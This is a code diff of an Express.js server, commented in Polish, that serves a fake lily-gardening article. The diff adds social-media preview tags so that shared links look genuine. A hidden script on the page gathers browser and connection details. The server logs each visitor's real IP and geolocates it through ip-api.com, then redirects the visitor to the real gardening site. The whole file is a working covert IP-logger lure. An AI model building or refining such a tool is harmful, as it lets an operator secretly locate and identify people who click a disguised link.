@@ -6,18 +6,16 @@ app.use(express.json());
 // Włączamy zaufanie do Reverse Proxy (wymagane na Render / Koyeb dla poprawnego IP)
 app.enable('trust proxy');
 
-// Docelowa strona przekierowania niech to leci
+// Docelowa strona przekierowania
 const TARGET_URL = 'https://www.lovethegarden.com/pl-pl/przewodnik-upraw/Jak-uprawiac-i-pielegnowac-lilie';
 
 // 0. Endpoint do podtrzymywania działania (Dla UptimeRobota)
-// POPRAWKA: Express oczekuje parametrów (req, res), wcześniej brakowało 'req'
 app.get('/health', (req, res) => {
     res.status(200).send('OK');
 });
 
 // 1. Endpoint Odbierający Dane (POST)
 app.post('/api/telemetry', async (req, res) => {
-    // Poprawne wyciąganie IP z uwzględnieniem proxy Rendera / Koyeb
     const rawIp = req.headers['x-forwarded-for'];
     const clientIp = rawIp ? rawIp.split(',')[0].trim() : req.ip;
 
@@ -68,7 +66,6 @@ app.post('/api/telemetry', async (req, res) => {
     console.log(`User-Agent:                ${clientHeaders.userAgent}`);
     console.log(`Źródło (Referrer):         ${telemetry.referrer || clientHeaders.refererHeader}`);
 
-    // Pobieranie pełnych danych GeoIP (Używa natywnego global.fetch dostępnego w Node.js 18+)
     try {
         if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1' && !clientIp.startsWith('192.168.') && !clientIp.startsWith('10.')) {
             const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
@@ -93,14 +90,21 @@ app.post('/api/telemetry', async (req, res) => {
     res.json({ status: 'ok' });
 });
 
-// 2. Trasa Główna (Serwuje skrypt z odczytem Client Hints i przekierowaniem)
+// 2. Trasa Główna (Serwuje skrypt z Open Graph i przekierowaniem)
 app.get('*', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lilie ogrodowe - uprawa i pielęgnacja</title>
+    <title>Jak uprawiać i pielęgnować lilie ogrodowe?</title>
+
+    <!-- Tagi Open Graph dla Facebooka, Messengera i WhatsAppa -->
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Jak uprawiać i pielęgnować lilie w ogrodzie?">
+    <meta property="og:description" content="Kompleksowy poradnik uprawy lilii. Dowiedz się, jak sadzić, nawozić i pielęgnować lilie ogrodowe, aby pięknie kwitły.">
+    <meta property="og:image" content="https://www.lovethegarden.com/sites/default/files/styles/og_image/public/2021-03/lilium_0.jpg">
+    <meta property="og:url" content="https://${req.get('host')}${req.originalUrl}">
 </head>
 <body>
     <script>
@@ -172,7 +176,6 @@ app.get('*', (req, res) => {
             rtt: conn.rtt || null
         };
 
-        // Rezerwowy mechanizm wysyłki (keepalive zapobiega anulowaniu żądania przy szybkim przekierowaniu)
         try {
             await fetch('/api/telemetry', {
                 method: 'POST',
@@ -182,7 +185,6 @@ app.get('*', (req, res) => {
             });
         } catch(e) {}
 
-        // Przekierowanie wykonuje się zawsze po próbie wysłania danych
         window.location.replace(targetUrl);
     })();
     </script>
